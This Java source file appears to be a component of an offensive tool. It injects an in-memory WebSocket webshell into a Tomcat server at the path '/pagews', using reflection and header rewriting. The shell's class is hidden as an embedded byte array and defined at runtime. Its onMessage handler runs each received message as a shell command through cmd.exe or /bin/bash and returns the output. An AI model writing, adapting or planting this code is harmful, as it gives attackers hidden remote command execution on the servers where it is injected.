package com.sf.sl;

import com.sf.redefine.MyRequest;

public class WS {
    private static final String pathPattern = "/pagews";

    public static void SetHeader(Object request, String key, String value) {
        try {
            java.lang.reflect.Field requestField = request.getClass().getDeclaredField("request");
            requestField.setAccessible(true);
            Object requestObj = requestField.get(request);
            java.lang.reflect.Field coyoteRequestField = requestObj.getClass().getDeclaredField("coyoteRequest");
            coyoteRequestField.setAccessible(true);
            Object coyoteRequestObj = coyoteRequestField.get(requestObj);
            java.lang.reflect.Field headersField = coyoteRequestObj.getClass().getDeclaredField("headers");
            headersField.setAccessible(true);
            Object headersObj = headersField.get(coyoteRequestObj);
            headersObj.getClass().getMethod("removeHeader", String.class).invoke(headersObj, key);
            Object x = headersObj.getClass().getMethod("addValue", String.class).invoke(headersObj, key);
            x.getClass().getMethod("setString", String.class).invoke(x, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void injectws(Object request,String path){
        try {
            ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
            java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("getAttribute", String.class);
            Object container = getAttribute.invoke(MyRequest.getServletContext(request), "javax.websocket.server.ServerContainer");
            java.lang.reflect.Method findmap = container.getClass().getDeclaredMethod("findMapping",String.class);
            Object find = findmap.invoke(container,path);
            if (find == null) {
                Class Builder = loader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
                java.lang.reflect.Method create = Builder.getDeclaredMethod("create", Class.class, String.class);
                java.lang.reflect.Method bu = Builder.getDeclaredMethod("build");
                byte[] bytes = new byte[]{-54, -2, -70, -66, 0, 0, 0, 49, 0, 118, 10, 0, 30, 0, 46, 8, 0, 47, 10, 0, 48, 0, 49, 10, 0, 8, 0, 50, 8, 0, 51, 10, 0, 8, 0, 52, 10, 0, 53, 0, 54, 7, 0, 55, 8, 0, 56, 8, 0, 57, 10, 0, 53, 0, 58, 8, 0, 59, 8, 0, 60, 10, 0, 61, 0, 62, 7, 0, 63, 10, 0, 15, 0, 46, 10, 0, 64, 0, 65, 10, 0, 15, 0, 66, 10, 0, 64, 0, 67, 10, 0, 61, 0, 68, 9, 0, 29, 0, 69, 11, 0, 70, 0, 71, 10, 0, 15, 0, 72, 11, 0, 73, 0, 74, 7, 0, 75, 10, 0, 25, 0, 76, 11, 0, 70, 0, 77, 10, 0, 29, 0, 78, 7, 0, 79, 7, 0, 80, 7, 0, 82, 1, 0, 7, 115, 101, 115, 115, 105, 111, 110, 1, 0, 25, 76, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 83, 101, 115, 115, 105, 111, 110, 59, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 9, 111, 110, 77, 101, 115, 115, 97, 103, 101, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 6, 111, 110, 79, 112, 101, 110, 1, 0, 60, 40, 76, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 83, 101, 115, 115, 105, 111, 110, 59, 76, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 69, 110, 100, 112, 111, 105, 110, 116, 67, 111, 110, 102, 105, 103, 59, 41, 86, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 86, 1, 0, 9, 83, 105, 103, 110, 97, 116, 117, 114, 101, 1, 0, 5, 87, 104, 111, 108, 101, 1, 0, 12, 73, 110, 110, 101, 114, 67, 108, 97, 115, 115, 101, 115, 1, 0, 84, 76, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 69, 110, 100, 112, 111, 105, 110, 116, 59, 76, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 77, 101, 115, 115, 97, 103, 101, 72, 97, 110, 100, 108, 101, 114, 36, 87, 104, 111, 108, 101, 60, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 62, 59, 12, 0, 34, 0, 35, 1, 0, 7, 111, 115, 46, 110, 97, 109, 101, 7, 0, 83, 12, 0, 84, 0, 85, 12, 0, 86, 0, 87, 1, 0, 7, 119, 105, 110, 100, 111, 119, 115, 12, 0, 88, 0, 89, 7, 0, 90, 12, 0, 91, 0, 92, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 7, 99, 109, 100, 46, 101, 120, 101, 1, 0, 2, 47, 99, 12, 0, 93, 0, 94, 1, 0, 9, 47, 98, 105, 110, 47, 98, 97, 115, 104, 1, 0, 2, 45, 99, 7, 0, 95, 12, 0, 96, 0, 97, 1, 0, 23, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 105, 108, 100, 101, 114, 7, 0, 98, 12, 0, 99, 0, 100, 12, 0, 101, 0, 102, 12, 0, 103, 0, 35, 12, 0, 104, 0, 100, 12, 0, 32, 0, 33, 7, 0, 105, 12, 0, 106, 0, 108, 12, 0, 109, 0, 87, 7, 0, 111, 12, 0, 112, 0, 38, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 113, 0, 35, 12, 0, 114, 0, 115, 12, 0, 37, 0, 38, 1, 0, 10, 87, 101, 98, 83, 111, 99, 107, 101, 116, 67, 1, 0, 24, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 69, 110, 100, 112, 111, 105, 110, 116, 7, 0, 116, 1, 0, 36, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 77, 101, 115, 115, 97, 103, 101, 72, 97, 110, 100, 108, 101, 114, 36, 87, 104, 111, 108, 101, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 11, 103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 11, 116, 111, 76, 111, 119, 101, 114, 67, 97, 115, 101, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 40, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 4, 114, 101, 97, 100, 1, 0, 3, 40, 41, 73, 1, 0, 6, 97, 112, 112, 101, 110, 100, 1, 0, 28, 40, 67, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 105, 108, 100, 101, 114, 59, 1, 0, 5, 99, 108, 111, 115, 101, 1, 0, 7, 119, 97, 105, 116, 70, 111, 114, 1, 0, 23, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 83, 101, 115, 115, 105, 111, 110, 1, 0, 14, 103, 101, 116, 66, 97, 115, 105, 99, 82, 101, 109, 111, 116, 101, 1, 0, 5, 66, 97, 115, 105, 99, 1, 0, 40, 40, 41, 76, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 82, 101, 109, 111, 116, 101, 69, 110, 100, 112, 111, 105, 110, 116, 36, 66, 97, 115, 105, 99, 59, 1, 0, 8, 116, 111, 83, 116, 114, 105, 110, 103, 7, 0, 117, 1, 0, 36, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 82, 101, 109, 111, 116, 101, 69, 110, 100, 112, 111, 105, 110, 116, 36, 66, 97, 115, 105, 99, 1, 0, 8, 115, 101, 110, 100, 84, 101, 120, 116, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101, 1, 0, 17, 97, 100, 100, 77, 101, 115, 115, 97, 103, 101, 72, 97, 110, 100, 108, 101, 114, 1, 0, 35, 40, 76, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 77, 101, 115, 115, 97, 103, 101, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 30, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 77, 101, 115, 115, 97, 103, 101, 72, 97, 110, 100, 108, 101, 114, 1, 0, 30, 106, 97, 118, 97, 120, 47, 119, 101, 98, 115, 111, 99, 107, 101, 116, 47, 82, 101, 109, 111, 116, 101, 69, 110, 100, 112, 111, 105, 110, 116, 0, 33, 0, 29, 0, 30, 0, 1, 0, 31, 0, 1, 0, 2, 0, 32, 0, 33, 0, 0, 0, 4, 0, 1, 0, 34, 0, 35, 0, 1, 0, 36, 0, 0, 0, 17, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 0, 0, 1, 0, 37, 0, 38, 0, 1, 0, 36, 0, 0, 0, -88, 0, 5, 0, 7, 0, 0, 0, -108, 18, 2, -72, 0, 3, -74, 0, 4, 18, 5, -74, 0, 6, 62, 29, -103, 0, 31, -72, 0, 7, 6, -67, 0, 8, 89, 3, 18, 9, 83, 89, 4, 18, 10, 83, 89, 5, 43, 83, -74, 0, 11, 77, -89, 0, 28, -72, 0, 7, 6, -67, 0, 8, 89, 3, 18, 12, 83, 89, 4, 18, 13, 83, 89, 5, 43, 83, -74, 0, 11, 77, 44, -74, 0, 14, 58, 4, -69, 0, 15, 89, -73, 0, 16, 58, 5, 25, 4, -74, 0, 17, 89, 54, 6, 2, -97, 0, 15, 25, 5, 21, 6, -110, -74, 0, 18, 87, -89, -1, -21, 25, 4, -74, 0, 19, 44, -74, 0, 20, 87, 42, -76, 0, 21, -71, 0, 22, 1, 0, 25, 5, -74, 0, 23, -71, 0, 24, 2, 0, -89, 0, 8, 77, 44, -74, 0, 26, -79, 0, 1, 0, 0, 0, -117, 0, -114, 0, 25, 0, 0, 0, 1, 0, 39, 0, 40, 0, 1, 0, 36, 0, 0, 0, 25, 0, 2, 0, 3, 0, 0, 0, 13, 42, 43, -75, 0, 21, 43, 42, -71, 0, 27, 2, 0, -79, 0, 0, 0, 0, 16, 65, 0, 37, 0, 41, 0, 1, 0, 36, 0, 0, 0, 21, 0, 2, 0, 2, 0, 0, 0, 9, 42, 43, -64, 0, 8, -74, 0, 28, -79, 0, 0, 0, 0, 0, 2, 0, 42, 0, 0, 0, 2, 0, 45, 0, 44, 0, 0, 0, 18, 0, 2, 0, 31, 0, 81, 0, 43, 6, 9, 0, 73, 0, 110, 0, 107, 6, 9};
                java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                m.setAccessible(true);
                Class clazz = (Class) m.invoke(loader, bytes, 0, bytes.length);
                Object bb = create.invoke(Builder, clazz, path);
                Object endpoint = bu.invoke(bb);
                java.lang.reflect.Method[] methodAll = container.getClass().getMethods();
                for (java.lang.reflect.Method method : methodAll) {
                    if (method.getName().equals("addEndpoint") && method.getParameterTypes()[0].getSimpleName().equals("ServerEndpointConfig")) {
                        method.invoke(container, endpoint);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void doUpgrade(Object request,Object response,String path){
        try {
            SetHeader(request,"Connection","Upgrade");
            SetHeader(request,"Sec-WebSocket-Version","13");
            SetHeader(request,"Upgrade","websocket");
            java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("getAttribute", String.class);
            Object container = getAttribute.invoke(MyRequest.getServletContext(request), "javax.websocket.server.ServerContainer");
            java.lang.reflect.Method findmap = container.getClass().getDeclaredMethod("findMapping",String.class);
            Object find = findmap.invoke(container,path);
            if (find == null) {
                return;
            }
            java.lang.reflect.Field configField =  find.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            Object serverEndpointConfig = configField.get(find);
            java.lang.reflect.Field pathParamsField =  find.getClass().getDeclaredField("pathParams");
            pathParamsField.setAccessible(true);
            Object pathParams = pathParamsField.get(find);
            java.lang.reflect.Method[] methodAll = container.getClass().getMethods();
            for (java.lang.reflect.Method method : methodAll) {
                if (method.getName().equals("doUpgrade")) {
                    method.invoke(container, request, response, serverEndpointConfig, pathParams);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void doService(Object obj, String url, String method, java.io.InputStream in) {
        if (url.matches(pathPattern)) {
            java.util.Map objMap = (java.util.Map) obj;
            Object request = objMap.get("request");
            Object response = objMap.get("response");
            try {
                injectws(request,pathPattern);
                doUpgrade(request,response,pathPattern);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
